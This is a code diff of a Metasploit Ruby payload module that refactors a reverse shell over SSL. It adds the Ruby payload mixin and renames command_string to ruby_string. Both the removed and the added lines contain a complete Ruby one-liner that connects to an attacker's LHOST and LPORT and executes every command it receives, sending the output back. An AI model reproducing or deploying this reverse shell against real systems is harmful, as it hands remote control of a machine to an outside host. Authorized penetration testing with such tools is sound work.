@@ -10,6 +10,7 @@
 ##
 
 require 'msf/core'
+require 'msf/core/payload/ruby'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -17,6 +18,7 @@ require 'msf/base/sessions/command_shell_options'
 module Metasploit3
 
 	include Msf::Payload::Single
+	include Msf::Payload::Ruby
 	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
@@ -36,15 +38,15 @@ module Metasploit3
 	end
 
 	def generate
-		vprint_good(command_string)
-		return super + command_string
+		rbs = prepends(ruby_string)
+		vprint_good rbs
+		return rbs
 	end
 
-	def command_string
+	def ruby_string
 		lhost = datastore['LHOST']
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		cmd = datastore['PrependFork'] ? 'exit if fork;' : ''
-		cmd << "require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
-		return cmd
+		rbs = "require 'socket';require 'openssl';c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,\"r\"){|io|c.print io.read}end"
+		return rbs
 	end
 end
